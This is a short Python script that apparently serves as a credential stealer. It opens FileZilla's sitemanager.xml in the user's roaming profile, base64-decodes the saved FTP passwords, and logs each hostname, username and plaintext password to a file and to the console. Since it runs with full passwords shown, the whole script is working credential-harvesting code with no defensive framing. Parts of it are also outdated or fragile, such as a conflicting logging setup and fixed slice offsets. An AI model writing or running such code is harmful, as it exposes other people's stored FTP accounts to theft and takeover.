import base64
import os
import time
import logging
import sys

## Logging stuff
logging.basicConfig(filename='log.log' ,format='%(asctime)s - %(name)s - %(levelname)s | %(message)s |', stream=sys.stdout, level=logging.INFO)
console = logging.StreamHandler()
console.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s | %(message)s')
console.setFormatter(formatter)
logging.getLogger('').addHandler(console)

def filezilla(safe=0):
    logging.info("#" + 17 * "-" + "FTP" + 20 * "-"  + "#")
    home = os.path.expanduser("~") + "\\Appdata\Roaming\FileZilla\\"
    test2 = home + "sitemanager.xml"
    file = "pass.txt"
    user = '</User>'
    password = '</Pass>'
    host = '</Host>'

    with open(test2, "r") as f:
        searchlines = f.readlines()
    for i, line in enumerate(searchlines):
        if  password in line:
            for l in searchlines[i:i+1]:
                max = l.find(password)
                encrypted = l[27:max]
                pword = base64.decodestring(encrypted)
                if safe == 1:
                    logging.info("Password: %s" %pword)
                else:
                    logging.info("Password [Safe]: %s" %pword[0:3])
        elif user in line:
            for l in searchlines[i:i+1]:
                max = l.find(user)
                uname = l[9:max]
                logging.info("Username: %s" %uname)
        elif host in line:
            for l in searchlines[i:i+1]:
                max = l.find(host)
                hname = l[9:max]
                logging.info("#" + 40 * "-" + "#")
                logging.info("Hostname: %s" %hname)
    logging.info("#" + 40 * "-" + "#")
    f.close()

filezilla(safe=1)
